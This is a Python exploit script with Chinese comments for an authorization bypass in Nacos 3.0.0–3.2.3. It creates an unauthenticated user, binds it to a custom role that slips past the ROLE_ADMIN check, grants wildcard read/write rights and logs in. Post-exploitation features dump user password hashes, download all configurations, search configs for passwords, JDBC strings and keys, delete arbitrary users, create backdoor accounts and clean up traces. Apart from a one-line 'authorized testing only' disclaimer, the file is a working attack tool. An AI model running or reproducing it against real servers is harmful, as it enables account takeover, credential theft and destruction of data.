#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Nacos 3.x 用户/角色管理接口权限绕过漏洞 - 全功能 EXP
影响版本: 3.0.0 ~ 3.2.3 (默认部署 nacos.core.auth.enabled=false 即可利用)
Author: th31ov3

利用链 (4 步):
  1. POST   /nacos/v3/auth/user        未授权创建用户
  2. POST   /nacos/v3/auth/role        未授权创建角色并绑定用户 (自定义角色名绕过 ROLE_ADMIN 硬编码拦截)
  3. POST   /nacos/v3/auth/permission  未授权给角色授 resource=* / action=rw 通配权限
  4. POST   /nacos/v3/auth/user/login  登录获取 accessToken

用法示例:
  # 基础利用(随机用户名/密码/角色名)
  python exp.py http://target:8848

  # 指定账号密码与角色名
  python exp.py http://target:8848 -u ghost -p Ghost@2026 -r ghostrole

  # 利用后列用户/读配置/搜敏感配置
  python exp.py http://target:8848 --list-users --list-configs
  python exp.py http://target:8848 --dump-config db.properties DEFAULT_GROUP public
  python exp.py http://target:8848 --search-configs "password|secret|jdbc"
  python exp.py http://target:8848 --down-configs                    # 批量下载全部配置
  python exp.py http://target:8848 --down-configs ".*\\.properties$"  # 只下载 .properties
  python exp.py http://target:8848 --down-configs --out-dir ./loot   # 指定下载目录

  # 指定账号直接进入后渗透(已利用过的目标)
  python exp.py http://target:8848 -u ghost -p Ghost@2026 --login-only --list-users

  # 删除任意用户 / 清理自己创建的痕迹
  python exp.py http://target:8848 -u ghost -p Ghost@2026 --login-only --del-user victim
  python exp.py http://target:8848 -u ghost -p Ghost@2026 --login-only --cleanup

  # 创建任意账号(未授权直接操作, 无需登录) / 删除角色
  python exp.py http://target:8848 --create-user backdoor Bd@2026
  python exp.py http://target:8848 --del-user backdoor
  python exp.py http://target:8848 --del-role ghostrole ghost

  # 检测目标版本信息
  python exp.py http://target:8848 --info

仅用于已授权的安全测试。
"""
import argparse
import json
import random
import re
import string
import sys
import time
from urllib.parse import urlparse

try:
    import requests
    import urllib3
    urllib3.disable_warnings()
except ImportError:
    print("[-] 缺少 requests 库: pip install requests")
    sys.exit(1)

TAG = "[Nacos3x-EXP]"
SENSITIVE_PATTERN = re.compile(
    r"password|passwd|secret|jdbc|mysql|redis|token|api[_-]?key|access[_-]?key|"
    r"private[_-]?key|credential|ak[\"']?\s*[:=]|sk[\"']?\s*[:=]",
    re.IGNORECASE,
)


def rand_suffix(n: int = 8) -> str:
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))


class NacosExp:
    def __init__(self, target: str, timeout: float = 10):
        # 剥离 #前端路由 / ?参数, 只保留 scheme://host[:port][/path]
        p = urlparse(target if "://" in target else "http://" + target)
        base = f"{p.scheme}://{p.netloc}"
        self.target = (base + (p.path or "")).rstrip("/")
        self.timeout = timeout
        self.s = requests.Session()
        self.s.verify = False
        self.s.headers["User-Agent"] = "Nacos-Client"
        self.token = None
        self.username = None
        self.role = None
        # 自动探测 API 基址: 目标可能是控制台端口(8080)或 API 端口(8848), 路径可能带/不带 /nacos
        self.api_base = self._probe_api_base()

    def _candidate_api_bases(self) -> list:
        """生成候选 API 基址(按优先级)。
        实测真实环境形态:
          - API 在 http://host:8848/nacos/v3/...   ← 最常见, 官方部署(优先)
          - API 在 http://host:8080/nacos/...     ← 部分部署控制台也代理 API
          - API 直接挂根路径                        ← 定制/反代部署
          - 控制台在 8080, API 仍在 8848/nacos     ← 3.x 双端口分离
        """
        base = self.target
        m = urlparse(base)
        # 8848(API 端口)优先于 8080(控制台端口), 因为漏洞入口几乎都在 8848
        hosts = []
        try:
            if m.port == 8080:
                hosts.append(f"{m.scheme}://{m.hostname}:8848")
        except ValueError:
            pass
        hosts.append(base)
        try:
            if m.port == 8848:
                hosts.append(f"{m.scheme}://{m.hostname}:8080")
        except ValueError:
            pass
        candidates = []
        for h in hosts:
            candidates.append(h + "/nacos")
            candidates.append(h)
        seen = set()
        return [c for c in candidates if not (c in seen or seen.add(c))]

    def _looks_like_nacos(self, resp) -> bool:
        """判断响应是否带 Nacos 特征。"""
        if resp.status_code == 404:
            return False
        text = resp.text[:500].lower()
        markers = ("nacos", "accesstoken", "user not found", "unknown user",
                   "access denied", "authorization failed", "no auth")
        return any(k in text for k in markers)

    def _probe_api_base(self) -> str:
        """探测可用的 Nacos API 基址。
        优先找能打穿漏洞的基址(未认证 createUser 可达), 其次找能登录的基址。
        """
        # 第一轮: 找漏洞入口(未授权 POST /v3/auth/user 返回 Nacos 成功响应)
        for c in self._candidate_api_bases():
            try:
                r = self.s.post(f"{c}/v3/auth/user",
                                data={"username": "probe_th31ov3", "password": "Probe@2026"},
                                timeout=self.timeout)
                # 必须是 Nacos 成功响应(code:0), 才算漏洞入口基址
                if r.status_code == 200 and '"code":0' in r.text:
                    # 清理探测用户, 避免留痕
                    try:
                        self.s.delete(f"{c}/v3/auth/user", params={"username": "probe_th31ov3"},
                                      timeout=self.timeout)
                    except requests.RequestException:
                        pass
                    return c
            except requests.RequestException:
                continue
        # 第二轮: 找 Nacos API 特征(用于 --login-only 等场景)
        for c in self._candidate_api_bases():
            try:
                r = self.s.post(f"{c}/v3/auth/user/login",
                                data={"username": "nacosprobe", "password": "x"},
                                timeout=self.timeout)
                if self._looks_like_nacos(r):
                    return c
            except requests.RequestException:
                continue
        return self.target

    # ---------- 基础 ----------
    def info(self) -> dict:
        """获取目标信息(版本等)"""
        out = {}
        for base in (self.api_base, self.api_base.rstrip("/nacos") if self.api_base.endswith("/nacos") else self.api_base):
            for ver_path in ("/v1/console/server/state", "/v3/console/server/state"):
                try:
                    r = self.s.get(f"{base}{ver_path}", timeout=self.timeout)
                    if r.status_code == 200:
                        try:
                            out[f"{base}{ver_path}"] = r.json()
                        except ValueError:
                            out[f"{base}{ver_path}"] = r.text[:200]
                except requests.RequestException:
                    pass
        # 控制台首页(8080)提示版本
        m = urlparse(self.target)
        try:
            r = self.s.get(f"{m.scheme}://{m.hostname}:8080/", timeout=self.timeout)
            mv = re.search(r"Nacos\s*[:：]?\s*v?(\d+\.\d+[\w.\-]*)", r.text, re.IGNORECASE)
            if mv:
                out["console_version"] = mv.group(1)
        except (requests.RequestException, ValueError):
            pass
        return out

    # ---------- 利用链 4 步 ----------
    def step1_create_user(self, username: str, password: str) -> bool:
        r = self.s.post(f"{self.api_base}/v3/auth/user",
                        data={"username": username, "password": password},
                        timeout=self.timeout)
        print(f"  [1] 创建用户 {username:<25s} -> {r.status_code} {r.text[:80]}")
        if r.status_code == 200 and '"code":0' in r.text:
            self.username = username
            return True
        if "already exist" in r.text:
            print("      用户已存在, 继续尝试后续步骤")
            self.username = username
            return True
        return False

    def step2_bind_role(self, role: str, username: str) -> bool:
        r = self.s.post(f"{self.api_base}/v3/auth/role",
                        data={"role": role, "username": username},
                        timeout=self.timeout)
        print(f"  [2] 创建角色 {role} 并绑定 {username:<12s} -> {r.status_code} {r.text[:80]}")
        if r.status_code == 200 and '"code":0' in r.text:
            self.role = role
            return True
        if "already bound" in r.text:
            print("      用户已绑定该角色, 继续")
            self.role = role
            return True
        return False

    def step3_grant_permission(self, role: str, resource="*", action="rw") -> bool:
        r = self.s.post(f"{self.api_base}/v3/auth/permission",
                        data={"role": role, "resource": resource, "action": action},
                        timeout=self.timeout)
        print(f"  [3] 授予角色 {role} 权限 {resource}:{action:<4s}    -> {r.status_code} {r.text[:80]}")
        return r.status_code == 200 and '"code":0' in r.text

    def step4_login(self, username: str, password: str) -> str | None:
        """登录获取 accessToken。
        注意: nacos.core.auth.caching.enabled 默认开启, 用户/权限缓存有 ~15s 刷新延迟,
        刚创建的用户立即登录可能失败, 需重试等待缓存刷新。
        """
        for i in range(9):
            try:
                r = self.s.post(f"{self.api_base}/v3/auth/user/login",
                                data={"username": username, "password": password},
                                timeout=self.timeout)
            except requests.RequestException as e:
                print(f"      登录请求异常: {e.__class__.__name__}, 重试...")
                time.sleep(5)
                continue
            if r.status_code == 200:
                try:
                    self.token = r.json()["accessToken"]
                    print(f"  [4] 登录 {username:<30s} -> 200"
                          + (f" (第{i+1}次尝试, 等待缓存刷新)" if i else ""))
                    print(f"      accessToken = {self.token[:70]}...")
                    return self.token
                except (ValueError, KeyError):
                    pass
            if i < 8:
                print(f"      登录未成功(HTTP {r.status_code}), 等待权限缓存刷新后重试 ({i+1}/9)...")
                time.sleep(5)
        print(f"      登录失败: {r.text[:100]}")
        return None

    def exploit(self, username: str, password: str, role: str) -> str | None:
        print(f"{TAG} 开始利用 {self.target}")
        print(f"{TAG} API 基址: {self.api_base}")
        if not self.step1_create_user(username, password):
            print("[-] 创建用户失败, 目标可能不受此漏洞影响")
            return None
        if not self.step2_bind_role(role, username):
            print("[-] 绑定角色失败")
            return None
        if not self.step3_grant_permission(role):
            print("[-] 授权失败")
            return None
        token = self.step4_login(username, password)
        if token:
            print(f"[+] 利用成功! 账号: {username} / {password}  角色: {role}")
        return token

    # ---------- 后渗透 ----------
    def _auth_headers(self) -> dict:
        if not self.token:
            print("[-] 无 token, 请先利用或 --login-only 登录")
            sys.exit(1)
        return {"Authorization": f"Bearer {self.token}"}

    def _authed_request(self, method: str, path: str, retries: int = 5,
                        delay: float = 5, **kwargs) -> "requests.Response":
        """带权限缓存刷新重试的认证请求。
        nacos.core.auth.caching.enabled 默认开启, 权限缓存有 ~15s 刷新延迟,
        刚授权的角色立即访问受保护接口可能 403, 需重试等待缓存刷新。
        """
        kwargs.setdefault("timeout", self.timeout)
        kwargs.setdefault("headers", self._auth_headers())
        last = None
        for i in range(retries):
            try:
                r = self.s.request(method, f"{self.api_base}{path}", **kwargs)
            except requests.RequestException:
                raise
            # 403/401 视为权限缓存未刷新, 重试; 其他状态码直接返回
            if r.status_code not in (401, 403) or i == retries - 1:
                return r
            last = r
            print(f"      权限缓存未刷新(HTTP {r.status_code}), {delay}s 后重试 ({i+1}/{retries})...")
            time.sleep(delay)
        return last

    def list_users(self, page_size=100) -> list:
        """列出所有用户(含 bcrypt 密码哈希)"""
        users = []
        page = 1
        while True:
            r = self._authed_request("GET", "/v3/auth/user/list",
                                    params={"pageNo": page, "pageSize": page_size})
            if r.status_code != 200:
                print(f"[-] 列用户失败: {r.status_code} {r.text[:80]}")
                break
            data = r.json().get("data") or {}
            items = data.get("pageItems") or []
            users.extend(items)
            total = data.get("totalCount", 0)
            if len(users) >= total or not items:
                break
            page += 1
        print(f"{TAG} 共 {len(users)} 个用户:")
        for u in users:
            print(f"    {u.get('username','?'):20s} hash={u.get('password','?')[:30]}...")
        return users

    def list_roles(self, page_size=100) -> list:
        """列出所有角色绑定"""
        roles = []
        page = 1
        while True:
            r = self._authed_request("GET", "/v3/auth/role/list",
                                    params={"pageNo": page, "pageSize": page_size})
            if r.status_code != 200:
                print(f"[-] 列角色失败: {r.status_code} {r.text[:80]}")
                break
            data = r.json().get("data") or {}
            items = data.get("pageItems") or []
            roles.extend(items)
            total = data.get("totalCount", 0)
            if len(roles) >= total or not items:
                break
            page += 1
        print(f"{TAG} 共 {len(roles)} 条角色绑定:")
        for x in roles:
            print(f"    {x.get('username','?'):20s} <- {x.get('role','?')}")
        return roles

    def list_configs(self, namespace_id="public", page_size=100, max_pages=0, quiet=False) -> list:
        """列出指定命名空间的配置列表"""
        configs = []
        page = 1
        while True:
            r = self._authed_request("GET", "/v3/admin/cs/config/list",
                                    params={"pageNo": page, "pageSize": page_size,
                                            "namespaceId": namespace_id})
            if r.status_code != 200:
                print(f"\n[-] 列配置失败: {r.status_code} {r.text[:80]}")
                break
            data = r.json().get("data") or {}
            items = data.get("pageItems") or []
            configs.extend(items)
            total = data.get("totalCount", 0)
            if not quiet:
                print(f"\r    已获取 {len(configs)}/{total} 条配置...", end="")
            if len(configs) >= total or not items:
                break
            page += 1
            if max_pages and page > max_pages:
                break
        if not quiet:
            print()
            print(f"{TAG} 命名空间 {namespace_id} 共 {len(configs)} 条配置")
            for c in configs[:20]:
                print(f"    {c.get('dataId','?'):40s} group={c.get('groupName','?')}")
            if len(configs) > 20:
                print(f"    ... (仅显示前 20 条, 用 --dump-config 读取具体内容)")
        return configs

    def dump_config(self, data_id: str, group: str, namespace_id="public", quiet=False) -> str | None:
        """读取单条配置内容"""
        r = self._authed_request("GET", "/v3/admin/cs/config",
                                params={"dataId": data_id, "groupName": group,
                                        "namespaceId": namespace_id})
        if r.status_code != 200:
            if not quiet:
                print(f"[-] 读取配置失败: {r.status_code} {r.text[:100]}")
            return None
        data = r.json().get("data") or {}
        content = data.get("content", "")
        if not quiet:
            print(f"{TAG} 配置 {data_id} (group={group}, ns={namespace_id}):")
            print("    " + "-" * 60)
            for line in content.splitlines()[:50]:
                print("    " + line)
            print("    " + "-" * 60)
        return content

    def search_configs(self, pattern: str, namespace_id="public", page_size=100) -> list:
        """拉取全部配置并按正则搜索敏感内容, 命中则打印"""
        configs = self.list_configs(namespace_id, page_size, quiet=True)
        print(f"{TAG} 共 {len(configs)} 条配置, 搜索关键词: {pattern}")
        hits = []
        for c in configs:
            content = self.dump_config(c["dataId"], c["groupName"], namespace_id, quiet=True)
            if content and re.search(pattern, content, re.IGNORECASE):
                hits.append((c, content))
                print(f"\n  [HIT] {c['dataId']} (group={c['groupName']}):")
                for line in content.splitlines():
                    if re.search(pattern, line, re.IGNORECASE):
                        print(f"      {line.strip()[:120]}")
        print(f"\n{TAG} 命中 {len(hits)} 条含敏感关键词的配置")
        return hits

    def down_configs(self, namespace_id="public", out_dir: str | None = None,
                     pattern: str | None = None, page_size=100) -> str:
        """批量下载全部配置到本地目录
        目录结构: <out_dir>/<namespace>/<group>/<dataId>
        pattern: 可选, 仅下载 dataId 匹配正则的配置
        """
        import os
        from urllib.parse import unquote

        if out_dir is None:
            host = re.sub(r"[^\w.\-]", "_", self.target.split("//")[-1])
            out_dir = os.path.join("nacos_dump", f"{host}_{namespace_id}_{rand_suffix(6)}")
        os.makedirs(out_dir, exist_ok=True)

        configs = self.list_configs(namespace_id, page_size, quiet=True)
        if pattern:
            configs = [c for c in configs if re.search(pattern, c.get("dataId", ""), re.IGNORECASE)]
        print(f"{TAG} 开始下载 {len(configs)} 条配置 -> {out_dir}")

        ok, fail = 0, 0
        for i, c in enumerate(configs, 1):
            data_id = c.get("dataId", f"unknown_{i}")
            group = c.get("groupName", "DEFAULT_GROUP")
            content = self.dump_config(data_id, group, namespace_id, quiet=True)
            if content is None:
                fail += 1
                continue
            # group 可能是超长 enc 串, 截断并清理非法路径字符
            group_dir = unquote(group)[:80]
            group_dir = re.sub(r'[\\/:*?"<>|]', "_", group_dir)
            data_name = re.sub(r'[\\/:*?"<>|]', "_", data_id)
            fpath = os.path.join(out_dir, namespace_id, group_dir, data_name)
            os.makedirs(os.path.dirname(fpath), exist_ok=True)
            with open(fpath, "w", encoding="utf-8") as f:
                f.write(content)
            ok += 1
            if i % 100 == 0 or i == len(configs):
                print(f"\r    进度 {i}/{len(configs)} (成功 {ok}, 失败 {fail})", end="")
        print()
        print(f"{TAG} 下载完成: {ok} 成功, {fail} 失败 -> {os.path.abspath(out_dir)}")
        # 生成索引清单
        index = os.path.join(out_dir, "_index.tsv")
        with open(index, "w", encoding="utf-8") as f:
            f.write("dataId\tgroup\tnamespace\tsize\n")
            for c in configs:
                f.write(f"{c.get('dataId','?')}\t{c.get('groupName','?')}\t{namespace_id}\t{len(c.get('dataId',''))}\n")
        print(f"{TAG} 索引清单: {os.path.abspath(index)}")
        return out_dir

    def delete_user(self, username: str) -> bool:
        """删除任意用户(deleteUser 同为漏标接口, 亦可未认证调用)"""
        r = self.s.delete(f"{self.api_base}/v3/auth/user",
                          params={"username": username}, timeout=self.timeout)
        print(f"{TAG} 删除用户 {username} -> {r.status_code} {r.text[:80]}")
        return r.status_code == 200

    def create_account(self, username: str, password: str, grant_admin: bool = True) -> bool:
        """创建任意账号并绑角色授权(管理员等价)。
        利用漏标的 user/role/permission 三个接口, 无需认证即可完成。
        """
        print(f"{TAG} 创建账号 {username} / {password}")
        # 1. 创建用户
        r = self.s.post(f"{self.api_base}/v3/auth/user",
                        data={"username": username, "password": password},
                        timeout=self.timeout)
        print(f"    [1] 创建用户 -> {r.status_code} {r.text[:80]}")
        if r.status_code != 200 or (r.status_code == 200 and '"code":0' not in r.text):
            if "already exist" not in r.text:
                return False
            print("    用户已存在, 继续")
        # 2. 绑定角色
        role = f"role_{rand_suffix(8)}"
        r = self.s.post(f"{self.api_base}/v3/auth/role",
                        data={"role": role, "username": username},
                        timeout=self.timeout)
        print(f"    [2] 绑定角色 {role} -> {r.status_code} {r.text[:80]}")
        # 3. 授权
        r = self.s.post(f"{self.api_base}/v3/auth/permission",
                        data={"role": role, "resource": "*", "action": "rw"},
                        timeout=self.timeout)
        print(f"    [3] 授予 *:rw 权限 -> {r.status_code} {r.text[:80]}")
        # 4. 验证登录(带缓存刷新重试)
        token = self.step4_login(username, password)
        if token:
            print(f"[+] 账号 {username} 创建成功, 已获管理员等价权限")
        return token is not None

    def delete_role(self, role: str, username: str | None = None) -> bool:
        """删除角色(或仅解绑某用户的角色)"""
        params = {"role": role}
        if username:
            params["username"] = username
        r = self.s.delete(f"{self.api_base}/v3/auth/role",
                          params=params, timeout=self.timeout)
        scope = f"(仅解绑 {username})" if username else "(删除角色全部绑定)"
        print(f"{TAG} 删除角色 {role} {scope} -> {r.status_code} {r.text[:80]}")
        return r.status_code == 200

    def cleanup(self, role: str | None = None) -> None:
        """清理本次利用创建的角色绑定与用户"""
        if role and self.username:
            # 解绑角色
            r = self.s.delete(f"{self.api_base}/v3/auth/role",
                              params={"role": role, "username": self.username},
                              timeout=self.timeout)
            print(f"{TAG} 解绑角色 {role} -> {r.status_code} {r.text[:60]}")
            # 删除角色下所有绑定
            r = self.s.delete(f"{self.api_base}/v3/auth/role",
                              params={"role": role}, timeout=self.timeout)
            print(f"{TAG} 删除角色 {role} -> {r.status_code} {r.text[:60]}")
        if self.username:
            self.delete_user(self.username)
        print(f"{TAG} 清理完成")


def main():
    banner = r"""
.____    ____________   _______________ _________.___  ___ ___  ____ ___.___
|    |   \_____  \   \ /   /\_   _____//   _____/|   |/   |   \|    |   \   |
|    |    /   |   \   Y   /  |    __)_ \_____  \ |   /    ~    \    |   /   |
|    |___/    |    \     /   |        \/        \|   \    Y    /    |  /|   |
|_______ \_______  /\___/   /_______  /_______  /|___|\___|_  /|______/ |___|
        \/       \/                 \/        \/            \/
        Nacos 3.x 权限绕过 EXP (3.0.0 ~ 3.2.3)
                     by th31ov3
"""
    p = argparse.ArgumentParser(description="Nacos 3.x auth bypass EXP")
    p.add_argument("target", help="目标 URL, 如 http://ip:8848")
    # 利用参数
    p.add_argument("-u", "--username", help="指定用户名(默认 poc_<随机8位>)")
    p.add_argument("-p", "--password", help="指定密码(默认 Poc@<随机6位>)")
    p.add_argument("-r", "--role", help="指定角色名(默认 pocrole_<随机8位>; 避开 ROLE_ADMIN 硬编码拦截)")
    p.add_argument("--login-only", action="store_true", help="跳过利用链, 直接用 -u/-p 登录(后渗透)")
    p.add_argument("--timeout", type=float, default=10)
    # 后渗透动作
    p.add_argument("--info", action="store_true", help="探测目标版本信息")
    p.add_argument("--list-users", action="store_true", help="列出所有用户")
    p.add_argument("--list-roles", action="store_true", help="列出所有角色绑定")
    p.add_argument("--list-configs", action="store_true", help="列出配置清单")
    p.add_argument("--namespace", default="public", help="命名空间(默认 public)")
    p.add_argument("--dump-config", nargs=2, metavar=("DATA_ID", "GROUP"), help="读取指定配置内容")
    p.add_argument("--down-configs", nargs="?", const="ALL", metavar="PATTERN",
                   help="批量下载全部配置到本地(可选正则过滤 dataId), 默认目录 nacos_dump/")
    p.add_argument("--out-dir", metavar="DIR", help="下载目录(配合 --down-configs, 默认 nacos_dump/<目标>_<ns>_<随机>)")
    p.add_argument("--search-configs", metavar="PATTERN", help="正则搜索配置内容中的敏感信息")
    p.add_argument("--sensitive", action="store_true", help="用内置关键词全量搜索敏感配置")
    p.add_argument("--del-user", metavar="USERNAME", help="删除指定用户")
    p.add_argument("--del-role", nargs="+", metavar=("ROLE", "USERNAME"),
                   help="删除角色(可跟用户名仅解绑该用户, 不跟则删除角色全部绑定)")
    p.add_argument("--create-user", nargs=2, metavar=("USERNAME", "PASSWORD"),
                   help="创建任意账号并绑角色授权(管理员等价), 无需先走利用链")
    p.add_argument("--cleanup", action="store_true", help="清理本次利用创建的账号与角色")
    args = p.parse_args()

    print(banner)
    print(f"{TAG} 仅用于已授权的安全测试\n")

    username = args.username or f"poc_{rand_suffix()}"
    password = args.password or f"Poc@{rand_suffix(6)}"
    role = args.role or f"pocrole_{rand_suffix()}"

    exp = NacosExp(args.target, timeout=args.timeout)

    if args.info:
        info = exp.info()
        print(f"{TAG} 目标信息:")
        for k, v in info.items():
            print(f"    {k}: {json.dumps(v, ensure_ascii=False)[:200]}")
        if not info:
            print("    未获取到信息")
        return

    # 独立动作: 直接操作用户/角色(利用漏标接口, 无需认证, 不跑利用链)
    if args.create_user:
        cu, cp = args.create_user
        ok = exp.create_account(cu, cp)
        sys.exit(0 if ok else 1)

    if args.del_role:
        if len(args.del_role) == 2:
            exp.delete_role(args.del_role[0], args.del_role[1])
        else:
            exp.delete_role(args.del_role[0])
        return

    # 纯删除模式: 只指定 --del-user 且未要求其他后渗透动作时, 直接删(漏标接口未认证可达)
    if args.del_user and not any([args.list_users, args.list_roles, args.list_configs,
                                  args.dump_config, args.down_configs is not None,
                                  args.search_configs, args.sensitive, args.cleanup]):
        exp.delete_user(args.del_user)
        return

    if args.login_only:
        if not (args.username and args.password):
            print("[-] --login-only 需要同时指定 -u 和 -p")
            sys.exit(1)
        exp.username = username
        exp.role = role
        if not exp.step4_login(username, password):
            sys.exit(1)
    else:
        if not exp.exploit(username, password, role):
            sys.exit(1)

    print()
    post = False
    if args.list_users:
        exp.list_users(); post = True
    if args.list_roles:
        exp.list_roles(); post = True
    if args.list_configs:
        exp.list_configs(args.namespace); post = True
    if args.dump_config:
        exp.dump_config(args.dump_config[0], args.dump_config[1], args.namespace); post = True
    if args.down_configs is not None:
        pattern = None if args.down_configs == "ALL" else args.down_configs
        exp.down_configs(args.namespace, args.out_dir, pattern); post = True
    if args.search_configs:
        exp.search_configs(args.search_configs, args.namespace); post = True
    if args.sensitive:
        exp.search_configs(SENSITIVE_PATTERN.pattern, args.namespace); post = True
    if args.del_user:
        # 走到这里说明用户同时要后渗透+删用户, 先删(带登录态)
        exp.delete_user(args.del_user); post = True
    if args.cleanup:
        exp.cleanup(args.role); post = True

    if not post:
        print(f"{TAG} 完成。accessToken:\n{exp.token}")
        print(f"{TAG} 后续可加 --list-users / --list-configs / --sensitive / --dump-config 等参数")


if __name__ == "__main__":
    main()
